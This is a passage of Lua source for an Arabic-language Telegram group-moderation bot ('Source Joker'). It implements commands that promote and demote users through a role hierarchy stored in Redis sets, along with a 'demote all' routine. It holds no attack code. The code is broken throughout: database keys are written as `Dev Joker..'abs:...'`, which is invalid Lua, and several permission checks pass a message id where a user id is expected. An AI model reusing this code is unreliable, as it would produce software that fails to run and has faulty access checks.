Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
end
--     Source Joker     --
--       Set SudoBot        --
if is_sudo(msg) then
if text ==('رفع مطور') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:SudoBot:',result.sender_user_id_)
setSudoBot(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:SudoBot:',result.id_)
setSudoBot(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور (%d+)') and ChCheck(msg) then
local user = text:match('رفع مطور (%d+)')
DevAbs:sadd(Dev Joker..'abs:SudoBot:',user)
setSudoBot(msg,msg.chat_id_,user)
end
--     Source Joker     --
--       Rem SudoBot        --
if text ==('تنزيل مطور') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:SudoBot:',result.sender_user_id_)
delSudoBot(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:SudoBot:',result.id_)
delSudoBot(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مطور (%d+)')
DevAbs:srem(Dev Joker..'abs:SudoBot:',user)
delSudoBot(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--      Set ownerall      --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:ownerall:',result.sender_user_id_)
setownerall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:ownerall:',result.id_)
setownerall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAbs:sadd(Dev Joker..'abs:ownerall:',user)
setownerall(msg,msg.chat_id_,user)
end
--     Source Joker     --
--      Rem ownerall      --
if text ==('تنزيل مدير عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:ownerall:',result.sender_user_id_)
delownerall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:ownerall:',result.id_)
delownerall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbs:srem(Dev Joker..'abs:ownerall:',user)
delownerall(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--      Set adminall      --
if is_ownerall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:adminall:',result.sender_user_id_)
setadminall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:adminall:',result.id_)
setadminall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAbs:sadd(Dev Joker..'abs:adminall:',user)
setadminall(msg,msg.chat_id_,user)
end
--     Source Joker     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:adminall:',result.sender_user_id_)
deladminall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:adminall:',result.id_)
deladminall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbs:srem(Dev Joker..'abs:adminall:',user)
deladminall(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--       Set Vipall       --
if is_adminall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:vipall:',result.sender_user_id_)
setvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:vipall:',result.id_)
setvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAbs:sadd(Dev Joker..'abs:vipall:',user)
setvipall(msg,msg.chat_id_,user)
end
--     Source Joker     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:vipall:',result.sender_user_id_)
delvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:vipall:',result.id_)
delvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbs:srem(Dev Joker..'abs:vipall:',user)
delvipall(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--       Set Monsh        --
if ChatType == 'sp' or ChatType == 'gp'  then
if is_absmonsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
setmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:monsh:'..msg.chat_id_,result.id_)
setmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbs:sadd(Dev Joker..'abs:monsh:'..msg.chat_id_,user)
setmonsh(msg,msg.chat_id_,user)
end
--     Source Joker     --
--       Rem Monsh        --
if text ==('تنزيل منشئ اساسي') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
delmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.id_)
delmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,user)
delmonsh(msg,msg.chat_id_,user)
end end
if text ==('رفع منشئ اساسي') and not is_absmonsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر لمنشئ المجموعة والمطورين فقط', 1, 'md')
end
--     Source Joker     --
--      Set monshid       --
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
setmonshid(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
setmonshid(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and ChCheck(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAbs:sadd(Dev Joker..'abs:monshid:'..msg.chat_id_,user)
setmonshid(msg,msg.chat_id_,user)
end
--     Source Joker     --
--      Rem monshid       --
if text ==('تنزيل منشئ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
delmonshid(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.id_)
delmonshid(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,user)
delmonshid(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--       Set Owner        --
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(Dev Joker..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
setowner(msg,msg.chat_id_,result.sender_user_id_)
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:owners:'..msg.chat_id_,result.id_)
setowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and ChCheck(msg) then
local user = text:match('رفع مدير (%d+)')
DevAbs:sadd(Dev Joker..'abs:owners:'..msg.chat_id_,user)
setowner(msg,msg.chat_id_,user)
end
--     Source Joker     --
--       Rem Owner        --
if text ==('تنزيل مدير') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
delowner(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_,result.id_)
delowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_,user)
delowner(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--       Set admin        --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
setadmins(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not is_monsh(msg.id_, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_,result.id_)
setadmins(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and ChCheck(msg) then
local user = text:match('رفع ادمن (%d+)')
if not is_monsh(user, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_,user)
setadmins(msg,msg.chat_id_,user)
end
--     Source Joker     --
--        Rem admin       --
if text ==('تنزيل ادمن') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
deladmins(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_,result.id_)
deladmins(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_,user)
deladmins(msg,msg.chat_id_,user)
end end
--     Source Joker     --
--       Set Vipmem       --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Dev Joker..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
setvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not is_monsh(msg.id_, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevAbs:sadd(Dev Joker..'abs:vipmem:'..msg.chat_id_,result.id_)
setvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and ChCheck(msg) then
local user = text:match('رفع مميز (%d+)')
if not is_monsh(user, msg.chat_id_) and DevAbs:get(Dev Joker.."ABS_PROX:lock:set"..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevAbs:sadd(Dev Joker..'abs:vipmem:'..msg.chat_id_,user)
setvipmem(msg,msg.chat_id_,user)
end
--     Source Joker     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
delvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and ChCheck(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_,result.id_)
delvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and ChCheck(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_,user)
delvipmem(msg,msg.chat_id_,user)
end end 
end
--     Source Joker     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if is_leaderid(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end end
if DevAbs:sismember(Dev Joker..'abs:SudoBot:',result.sender_user_id_) then
SudoBot = 'المطورين • ' else SudoBot = '' end
if DevAbs:sismember(Dev Joker..'abs:ownerall:',result.sender_user_id_) then
ownerall = 'المدراء العامين • ' else ownerall = '' end
if DevAbs:sismember(Dev Joker..'abs:adminall:',result.sender_user_id_) then
adminall = 'الادمنية العامين • ' else adminall = '' end
if DevAbs:sismember(Dev Joker..'abs:vipall:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(Dev Joker..'abs:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'المنشئين الاساسيين • ' else monsh = '' end
if DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_, result.sender_user_id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المدراء • ' else owner = '' end
if DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنية • ' else admins = '' end
if DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = ''
end
if absmasco(result.sender_user_id_,msg.chat_id_) ~= false then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المسخدم ↫ ["..absc9.."]\n⌁︙تم تنزيله من ↫ ⤈\n⌯ ( "..SudoBot..''..ownerall..''..adminall..''..vpall..''..monsh..''..monshid..''..owner..''..admins..''..vipmem.." ) ⌯ \n", 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙العضو ↫ ["..absc9.."]\n⌁︙لم تتم ترقيته مسبقا", 1, 'md')
end
if masco(msg.sender_user_id_,msg.chat_id_) == 'botow' then
DevAbs:srem(Dev Joker..'abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'SudoBot' then
DevAbs:srem(Dev Joker..'abs:ownerall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:adminall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipall:', result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'absmonsh' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'monshid' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif masco(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if is_leaderid(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end end
if DevAbs:sismember(Dev Joker..'abs:SudoBot:',result.id_) then
SudoBot = 'المطورين • ' else SudoBot = '' end
if DevAbs:sismember(Dev Joker..'abs:ownerall:',result.id_) then
ownerall = 'المدراء العامين • ' else ownerall = '' end
if DevAbs:sismember(Dev Joker..'abs:adminall:',result.id_) then
adminall = 'الادمنية العامين • ' else adminall = '' end
if DevAbs:sismember(Dev Joker..'abs:vipall:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(Dev Joker..'abs:monsh:'..msg.chat_id_, result.id_) then
monsh = 'المنشئين الاساسيين • ' else monsh = '' end
if DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_, result.id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_, result.id_) then
owner = 'المدراء • ' else owner = '' end
if DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنية • ' else admins = '' end
if DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = ''
end
if absmasco(result.id_,msg.chat_id_) ~= false then
